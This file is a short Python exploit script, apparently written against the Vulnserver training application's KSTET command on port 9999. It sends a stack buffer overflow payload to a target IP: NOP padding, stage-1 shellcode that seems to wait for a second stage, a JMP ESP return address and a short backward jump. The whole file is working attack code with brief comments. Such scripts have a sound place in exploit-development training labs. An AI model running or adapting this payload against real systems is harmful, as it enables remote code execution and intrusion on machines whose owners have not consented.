#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# Stage 1 Shellcode.
STAGE1 = (
    b'\x83\xec\x64\x31\xff\x31\xdb\x53\x80\xc7\x04\x53' +
    b'\x89\xe3\x83\xc3\x64\x53\x47\x57\xb8\xa0\x23\xf1' +
    b'\x74\xff\xd0\x85\xc0\x75\xe6'
)

# Generate a payload the server expects: Command followed by Data
PAYLOAD = (
    b'KSTET ' +
    # NOP Padding
    b'\x90' * 8 +
    STAGE1 +
    b'A' * (58 - 8 - len(STAGE1)) +
    # 625014E6    FFE4                        JMP ESP
    struct.pack('<L', 0x625014E6) +
    # JMP SHORT 0xb5
    b'\xeb\xb8' +
    b'C' * (26 - 2)
)

# Send the message to the server.
with socket.create_connection((HOST, PORT)) as fd:
    print('Sending stage-1 payload...')
    fd.sendall(PAYLOAD)
    # This will trigger our stage-1 payload
    print('Sent stage-1 payload.')
    